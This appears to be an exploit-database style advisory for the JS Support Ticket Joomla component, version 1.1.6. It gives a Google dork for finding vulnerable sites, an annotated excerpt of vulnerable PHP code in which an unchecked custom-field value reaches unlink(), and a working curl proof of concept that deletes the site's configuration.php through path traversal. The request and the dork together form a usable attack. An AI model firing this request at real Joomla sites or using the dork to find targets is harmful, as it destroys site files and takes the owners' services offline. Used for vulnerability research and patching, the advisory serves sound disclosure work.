#Dork: inurl:"index.php?option=com_jssupportticket"
#Exploit Author: qw3rTyTy
#Vendor Homepage: https://www.joomsky.com/
#Software Link: https://www.joomsky.com/46/download/1.html
#Version: 1.1.6
#Tested on: Debian/nginx/joomla 3.9.0
#####################################
#Vulnerability details:
#####################################
This vulnerability is caused when processing custom user field.

file:	admin/models/ticket.php
function:	storeTicket

    54	    function storeTicket($data){
    ...snip...
    75	        $userfield = $this->getJSModel(&#039;userfields&#039;)->getUserfieldsfor(1);
    76	        $params = array();
    77		foreach ($userfield AS $ufobj) {
    78				$vardata = &#039;&#039;;
    ...snip...
   121			if(isset($data[$ufobj->field.&#039;_1&#039;]) && $data[$ufobj->field.&#039;_1&#039;] == 1){
   122	                $customflagfordelete = true;
   123			$custom_field_namesfordelete[]= $data[$ufobj->field.&#039;_2&#039;];	//no check.
   	...snip...
   198	        if($customflagfordelete == true){
   199			foreach ($custom_field_namesfordelete as $key) {
   200	                $res = $this->removeFileCustom($ticketid,$key);	//!!!
   201	            }
   202	        }
   ...snip...
  1508	    function removeFileCustom($id, $key){
  1509	        $filename = str_replace(&#039; &#039;, &#039;_&#039;, $key);
  1510	
  1511	        if(! is_numeric($id))
  1512	            return;
  1513	
  1514	        $db = JFactory::getDbo();
  1515	        $config = $this->getJSModel(&#039;config&#039;)->getConfigByFor(&#039;default&#039;);
  1516	        $datadirectory = $config[&#039;data_directory&#039;];
  1517	
  1518	        $base = JPATH_BASE;
  1519	        if(JFactory::getApplication()->isAdmin()){
  1520	            $base = substr($base, 0, strlen($base) - 14); //remove administrator    
  1521	        }
  1522	
  1523	        $path = $base . &#039;/&#039; . $datadirectory. &#039;/attachmentdata/ticket&#039;;
  1524	
  1525	        $query = "SELECT attachmentdir FROM `#__js_ticket_tickets` WHERE id = ".$id;
  1526	        $db->setQuery($query);
  1527	        $foldername = $db->loadResult();
  1528	        $userpath = $path . &#039;/&#039; . $foldername.&#039;/&#039;.$filename;
  1529	        unlink($userpath);	//!!!
  1530	        return;
  1531	    }

#####################################
#PoC:
#####################################
When administrator has added custom user field as "19", attacker are can trigger this vulnerability by send a following request.

$> curl -X POST -i -F &#039;option=com_jssupportticket&#039; -F &#039;c=ticket&#039; -F &#039;task=saveTicket&#039; -F &#039;{VALID_FORMTOKEN_FROM_FORMTICKET}=1&#039; -F &#039;Itemid=666&#039; -F &#039;id=&#039; -F &#039;message=woot&#039; -F &#039;19_1=1&#039; -F &#039;19_2=../../../../configuration.php&#039; -F &#039;filename[]=@./woot.txt&#039; -H &#039;Cookie: VALID_SESSION_ID=VALID_SESSION_ID&#039; &#039;http://localhost/index.php&#039;

